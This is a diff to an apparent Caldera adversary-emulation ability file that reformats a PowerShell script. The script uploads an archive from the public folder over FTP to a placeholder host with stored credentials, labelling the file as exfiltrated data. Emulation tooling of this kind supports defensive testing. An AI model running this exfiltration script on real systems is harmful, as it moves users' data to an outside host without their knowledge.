@@ -22,63 +22,34 @@
     code: null
     build_target: null
     command: '# Variables to update
-
       $Username = "caldera_user";
-
       $Password = "caldera";
-
       $Ftp = "ftp://0.0.0.0";
-
       $FtpPort = "2222";
-
       $ArchiveName = "data.zip";
-
       $LocalStorageDir = "$env:PUBLIC";
-
       #
-
       #Do not modify anything below this line.
-
       #
-
       $slash = "/";
-
       $AntiSlash = "\";
-
       $Column = ":";
-
       $FullPathArchive = "$LocalStorageDir$AntiSlash$ArchiveName";
-
       $RemoteFileName = "$(Get-Date -Format yyyymmddhhmmss)-exfil-$ArchiveName";
-
       $FtpUri = $Ftp + $Column + $FtpPort + $Slash + $RemoteFileName;
-
       $Uri=[system.URI] $FtpUri;
-
       $FtpUpload = [System.Net.FtpWebRequest]::Create("$FtpUri");
-
       $FtpUpload = [System.Net.FTPWebRequest]$FtpUpload;
-
       $FtpUpload.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile;
-
       $FtpUpload.Credentials = New-Object System.Net.NetworkCredential($Username,$Password);
-
       $FtpUpload.UseBinary = $true;
-
       $FtpUpload.UsePassive = $true;
-
       $FileContent = gc -encoding Byte $FullPathArchive;
-
       $FtpUpload.ContentLength = $FileContent.Length;
-
-      $Run = $FtpUpload.GetRequestStream()
-
-      $Run.Write($FileContent, 0, $FileContent.Length)
-
-      $Run.Close()
-
-      $Run.Dispose()
-
+      $Run = $FtpUpload.GetRequestStream();
+      $Run.Write($FileContent, 0, $FileContent.Length);
+      $Run.Close();
+      $Run.Dispose();
       '
   singleton: true
   buckets: []
